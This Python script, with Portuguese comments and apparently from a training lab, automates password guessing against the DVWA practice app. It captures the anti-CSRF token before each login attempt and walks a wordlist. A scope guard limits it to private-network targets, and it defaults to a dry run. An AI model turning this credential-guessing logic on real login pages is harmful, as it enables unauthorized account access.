#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dvwa_login_check.py - Verificador didatico de login do DVWA (ambiente de lab)
==============================================================================

Para que serve
--------------
O Medusa, no modulo `web-form`, e excelente contra formularios simples, mas o
DVWA pode exigir um token anti-CSRF (`user_token`) que muda a cada requisicao.
Quando isso acontece, o Medusa falha nao porque a senha esta errada, mas
porque o token expirou. Este script faz o fluxo correto:

  1. GET  /login.php            -> captura cookie de sessao + `user_token`
  2. POST /login.php            -> envia username, password, Login e user_token
  3. Le a resposta              -> detecta sucesso/falha e, se preciso, o novo token
  4. (opcional) GET /index.php  -> confirma que a sessao esta autenticada

Ele NAO e um brute forcer paralelo: e um *verificador*. A ideia didatica e
mostrar que, quando ha anti-CSRF, a ferramenta precisa entender o fluxo da
aplicacao -- e que essa e justamente uma das defesas mais eficazes.

Modos de uso
------------
Verificar UMA credencial:
    python3 scripts/dvwa_login_check.py --url http://192.168.56.101/dvwa \\
        --usuario admin --senha password --confirmo-lab

Testar uma lista de senhas para um usuario (sequencial, com pausa):
    python3 scripts/dvwa_login_check.py --url http://192.168.56.101/dvwa \\
        --usuario admin --lista wordlists/senhas.txt --pausa 1 --confirmo-lab

Sem --confirmo-lab o script roda em dry-run: valida a URL, resolve o alvo e
mostra o que faria, sem enviar nenhum POST.

Requisitos: Python 3.8+ e a biblioteca `requests` (pip install requests).
"""

from __future__ import annotations

import argparse
import ipaddress
import re
import socket
import sys
import time
import urllib.parse
from dataclasses import dataclass
from typing import Iterable, Optional

# O import e propositalmente preguicoso: o modo dry-run e a validacao de
# escopo funcionam sem a biblioteca instalada (util para checar a configuracao
# antes de preparar o ambiente Python).
requests = None  # type: ignore[assignment]


def carregar_requests():
    """Importa `requests` sob demanda. Encerra com instrucao clara se faltar."""
    global requests
    if requests is not None:
        return requests
    try:
        import requests as _requests  # noqa: PLC0415
    except ImportError:
        sys.stderr.write(
            "[erro] a biblioteca 'requests' nao esta instalada.\n"
            "       instale com: pip install requests   (ou: sudo apt install python3-requests)\n"
        )
        raise SystemExit(2)
    requests = _requests
    return requests


# =============================================================================
# Guarda de escopo
# =============================================================================
REDES_PERMITIDAS = (
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
)


def ip_permitido(ip_texto: str) -> bool:
    """True apenas para IPv4/IPv6 de loopback ou faixas privadas."""
    try:
        ip = ipaddress.ip_address(ip_texto)
    except ValueError:
        return False
    return any(ip in rede for rede in REDES_PERMITIDAS)


def validar_alvo(url: str) -> str:
    """Valida esquema e host da URL. Levanta SystemExit em caso de escopo invalido."""
    partes = urllib.parse.urlsplit(url)
    if partes.scheme not in ("http", "https"):
        sys.stderr.write(f"[erro] esquema nao suportado: {partes.scheme!r} (use http/https)\n")
        raise SystemExit(2)
    host = partes.hostname
    if not host:
        sys.stderr.write("[erro] URL sem host.\n")
        raise SystemExit(2)

    # Host e IP literal?
    try:
        ipaddress.ip_address(host)
        candidatos = [host]
    except ValueError:
        try:
            infos = socket.getaddrinfo(host, None, family=socket.AF_INET)
        except socket.gaierror:
            sys.stderr.write(f"[erro] nao foi possivel resolver {host!r}.\n")
            raise SystemExit(2)
        candidatos = sorted({info[4][0] for info in infos})

    for ip in candidatos:
        if not ip_permitido(ip):
            sys.stderr.write(
                f"[erro] ESCOPO RECUSADO: {host} resolve para {ip}, fora das faixas privadas.\n"
                "       Este script so aceita laboratorio isolado (10/8, 172.16/12, 192.168/16, 127/8).\n"
            )
            raise SystemExit(3)

    sys.stderr.write(f"[info] alvo validado: {host} -> {', '.join(candidatos)}\n")
    return host


# =============================================================================
# Deteccao do DVWA
# =============================================================================
REGEX_TOKEN = re.compile(
    r"""name\s*=\s*['"]user_token['"][^>]*?value\s*=\s*['"]([^'"]+)['"]""",
    re.IGNORECASE,
)
# Alguns temas invertem a ordem dos atributos
REGEX_TOKEN_INVERSO = re.compile(
    r"""value\s*=\s*['"]([^'"]+)['"][^>]*?name\s*=\s*['"]user_token['"]""",
    re.IGNORECASE,
)

MARCADORES_SUCESSO = (
    "logout.php",
    "Welcome to Damn Vulnerable Web Application",
    "You have logged in as",
)
MARCADORES_FALHA = (
    "Login failed",
    "Username and/or password incorrect",
    "user_token' field was incorrect",
)


@dataclass
class Resultado:
    credencial: str
    sucesso: bool
    motivo: str
    usou_token: bool
    status_http: Optional[int] = None


def extrair_token(html: str) -> Optional[str]:
    """Captura o valor de `user_token` em um formulario HTML."""
    for regex in (REGEX_TOKEN, REGEX_TOKEN_INVERSO):
        achado = regex.search(html)
        if achado:
            return achado.group(1)
    return None


def classificar_resposta(html: str, status: int) -> tuple[bool, str]:
    """Heuristica de sucesso/falha baseada em marcadores conhecidos do DVWA."""
    corpo = html.lower()
    for marcador in MARCADORES_FALHA:
        if marcador.lower() in corpo:
            return False, f"marcador de falha: {marcador!r}"
    for marcador in MARCADORES_SUCESSO:
        if marcador.lower() in corpo:
            return True, f"marcador de sucesso: {marcador!r}"
    # Sem marcador claro: usa o codigo HTTP e a presenca do formulario
    if "login.php" in corpo and "password" in corpo and status == 200:
        return False, "formulario de login reapresentado (provavel falha)"
    return False, f"resposta inconclusiva (HTTP {status})"


def tentar_login(
    sessao: requests.Session,
    url: str,
    usuario: str,
    senha: str,
    timeout: float,
    verbose: bool,
) -> Resultado:
    """Executa o fluxo GET (captura token) -> POST (envia credenciais)."""
    req = carregar_requests()
    url_login = url.rstrip("/") + "/login.php"
    rotulo = f"{usuario}:{senha}"

    try:
        pagina = sessao.get(url_login, timeout=timeout)
    except req.RequestException as exc:
        return Resultado(rotulo, False, f"erro de rede no GET: {exc}", False)

    token = extrair_token(pagina.text)
    if verbose:
        sys.stderr.write(f"[debug] GET {url_login} -> HTTP {pagina.status_code}, token={token!r}\n")

    dados = {"username": usuario, "password": senha, "Login": "Login"}
    if token:
        dados["user_token"] = token

    try:
        resposta = sessao.post(url_login, data=dados, timeout=timeout, allow_redirects=True)
    except req.RequestException as exc:
        return Resultado(rotulo, False, f"erro de rede no POST: {exc}", token is not None)

    if verbose:
        sys.stderr.write(
            f"[debug] POST {url_login} -> HTTP {resposta.status_code}, "
            f"url final={resposta.url!r}, cookies={dict(sessao.cookies)!r}\n"
        )

    sucesso, motivo = classificar_resposta(resposta.text, resposta.status_code)

    # Confirmacao extra: se a pagina final e uma URL autenticada
    if "/index.php" in resposta.url and "login.php" not in resposta.url:
        sucesso, motivo = True, "redirecionado para index.php apos o POST"

    return Resultado(rotulo, sucesso, motivo, token is not None, resposta.status_code)


# =============================================================================
# CLI
# =============================================================================
def carregar_lista(caminho: str) -> list[str]:
    with open(caminho, "r", encoding="utf-8", errors="replace") as arquivo:
        return [
            linha.strip()
            for linha in arquivo
            if linha.strip() and not linha.lstrip().startswith("#")
        ]


def montar_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Verifica credenciais no DVWA (laboratorio isolado).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  %(prog)s --url http://192.168.56.101/dvwa --usuario admin --senha password --confirmo-lab\n"
            "  %(prog)s --url http://192.168.56.101/dvwa --usuario admin --lista wordlists/senhas.txt --confirmo-lab\n"
        ),
    )
    parser.add_argument("--url", required=True, help="URL base do DVWA (ex.: http://IP/dvwa)")
    parser.add_argument("--usuario", default="admin", help="usuario a testar (padrao: admin)")
    grupo = parser.add_mutually_exclusive_group()
    grupo.add_argument("--senha", help="senha unica a testar")
    grupo.add_argument("--lista", help="arquivo com uma senha por linha")
    parser.add_argument("--pausa", type=float, default=1.0, help="pausa entre tentativas (s)")
    parser.add_argument("--timeout", type=float, default=10.0, help="timeout HTTP (s)")
    parser.add_argument("--security", default="low", help="nivel de seguranca do DVWA (registro)")
    parser.add_argument("--confirmo-lab", action="store_true", help="confirma execucao real")
    parser.add_argument("--verbose", "-v", action="store_true", help="saida de depuracao")
    return parser


def main(argv: Optional[Iterable[str]] = None) -> int:
    args = montar_parser().parse_args(list(argv) if argv else None)

    if not args.senha and not args.lista:
        sys.stderr.write("[erro] informe --senha ou --lista.\n")
        return 2

    host = validar_alvo(args.url)
    senhas = [args.senha] if args.senha else carregar_lista(args.lista)

    print("=" * 66)
    print(" DVWA - VERIFICADOR DE LOGIN (laboratorio)")
    print("=" * 66)
    print(f" URL base  : {args.url}")
    print(f" Alvo      : {host}")
    print(f" Usuario   : {args.usuario}")
    print(f" Senhas    : {len(senhas)}")
    print(f" Security  : {args.security} (registrado no relatorio)")
    print(f" Modo      : {'REAL (--confirmo-lab)' if args.confirmo_lab else 'DRY-RUN'}")
    print("=" * 66)

    if not args.confirmo_lab:
        print("\n[modo seguro] Nenhum POST seria enviado.")
        print("Fluxo que o script executaria:")
        print(f"  1. GET  {args.url.rstrip('/')}/login.php  -> captura cookie + user_token")
        for senha in senhas[:10]:
            print(f"  2. POST {args.url.rstrip('/')}/login.php  username={args.usuario} password={senha!r} Login=Login")
        if len(senhas) > 10:
            print(f"  ... mais {len(senhas) - 10} senha(s)")
        print("\nRepita o comando com --confirmo-lab para executar de verdade.")
        return 0

    req = carregar_requests()
    sessao = req.Session()
    sessao.headers.update({"User-Agent": "DIO-Lab-DVWA-Check/1.0 (estudo isolado)"})

    resultados: list[Resultado] = []
    for indice, senha in enumerate(senhas, start=1):
        resultado = tentar_login(sessao, args.url, args.usuario, senha, args.timeout, args.verbose)
        resultados.append(resultado)
        estado = "SUCESSO" if resultado.sucesso else "falha"
        token_info = "com token" if resultado.usou_token else "sem token"
        print(
            f"[{indice}/{len(senhas)}] {args.usuario}:{senha!r:<20} -> {estado:<8} "
            f"({token_info}; {resultado.motivo})"
        )
        if resultado.sucesso:
            break
        if indice < len(senhas):
            time.sleep(max(args.pausa, 0))

    achadas = [r for r in resultados if r.sucesso]
    print("\n" + "=" * 66)
    print(f" Tentativas: {len(resultados)}  |  Credenciais validas: {len(achadas)}")
    print("=" * 66)

    if achadas:
        print("\nCredencial valida encontrada:")
        print(f"  usuario={args.usuario}  senha={achadas[0].credencial.split(':', 1)[1]}")
        return 0

    print("\nNenhuma credencial valida. Registre a saida no seu docs/RELATORIO_MODELO.md.")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.stderr.write("\n[info] interrompido pelo usuario.\n")
        sys.exit(130)
